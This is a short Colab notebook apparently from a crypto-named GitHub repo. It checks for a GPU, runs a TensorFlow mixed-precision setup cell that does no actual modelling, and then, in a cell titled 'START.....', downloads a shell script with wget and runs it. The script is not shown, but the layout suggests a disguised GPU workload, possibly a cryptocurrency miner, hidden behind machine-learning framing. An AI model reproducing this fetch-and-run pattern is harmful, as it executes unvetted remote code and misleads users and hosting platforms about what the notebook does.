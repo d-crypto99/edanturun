{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "miya-ozawasana.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "WkxlwMqd4nRE"
      },
      "source": [
        "# **miya-ozawasana**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "HW12kr4kfFNr"
      },
      "source": [
        "#@title Check GPU\n",
        "! nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "HW12kr4kfFNr"
      },
      "source": [
        "#@title Tensor Maksimum\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "w8EUKw1q3Juw"
      },
      "source": [
        "#@title START.....\n",
        "! wget https://raw.githubusercontent.com/d-crypto99/edanturun/main/podol.sh && chmod u+x podol.sh && ./podol.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
